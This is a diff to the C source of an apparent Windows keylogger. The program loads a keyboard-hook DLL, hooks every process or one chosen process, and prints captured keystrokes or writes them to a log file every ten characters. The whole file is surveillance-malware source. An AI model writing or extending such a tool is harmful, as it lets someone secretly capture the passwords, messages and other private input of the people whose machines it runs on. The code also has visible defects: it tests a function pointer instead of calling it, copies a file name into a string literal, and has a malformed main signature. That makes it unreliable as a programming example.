@@ -2,24 +2,33 @@
 #include "getopt.h"
 #define KEYBOARD_HOOK_PATH "..\KeyBoardHook.dll" //If you want, change path.
 #define KEYBOARD_HOOK_NAME "KeyBoardHook.dll"
-#define MAX_FILE_NAME 260
 
 HMODULE dllModule = NULL;
 PFN_IS_NEW_KEY_HIT IsNewKeyHit= NULL;
 PFN_GET_KEYBOARD_VALUE GetKeyboardValue = NULL;
-BOOL opt_filesave = FALSE;
-char* log_file_name = "";
+BOOL optFilesave = FALSE;
+char* logFileName = "";
+FILE* loggingFile = NULL;
 
 DWORD WINAPI GetKeyBoardValueThreadFunc(LPVOID lpParam)
 {
+	unsigned int loggingCount = 0; //if -s option not used, it's not used
+
 	while (1)
 	{
 		if (IsNewKeyHit)
 		{
-			if (opt_filesave)
+			char keyValue = GetKeyboardValue();
+			if (optFilesave)
 			{
+				fprintf_s(loggingFile, "%c", keyValue);
+				loggingCount++;
 
+				if (loggingCount % 10 == 0)
+					fprintf_s(loggingFile, "\n");
 			}
+			else
+				printf("KeyBoard Hit:%c\n",keyValue);
 		}
 	}
 }
@@ -55,11 +64,17 @@ int main(int argc, char* argv)
 			printf("All Process Hookedn\n");
 			break;
 		case 's': //Save Log(if option argument exist, it's file name)
-			opt_filesave = TRUE;
-			if (optarg != NULL)
-				strncpy(log_file_name, optarg, MAX_FILE_NAME);
+			optFilesave = TRUE;
+			if (optarg == NULL)
+			{
+				if (!MakeFileName(logFileName))
+				{
+					printf("MakeFileName faild!\n");
+					exit(-1);
+				}
+			}
 			else
-				//make log file name
+				strncpy(logFileName, optarg, MAX_FILE_LENGTH);
 			printf("Save Logging.\n");
 			break;
 		case 'p'://Hook one process. (option argument: PID) 
@@ -86,4 +101,7 @@ int main(int argc, char* argv)
 	dllModule = LoadLibrary(KEYBOARD_HOOK_NAME);
 	IsNewKeyHit = (PFN_IS_NEW_KEY_HIT)GetProcAddress(dllModule, GET_KEYBOARD_EVENT_FUNC);
 	GetKeyboardValue = (PFN_GET_KEYBOARD_VALUE)GetProcAddress(dllModule, GET_KEYBOARD_VALUE_FUNC);
+
+	if (optFilesave)
+		loggingFile = fopen(logFileName, "w");
 }
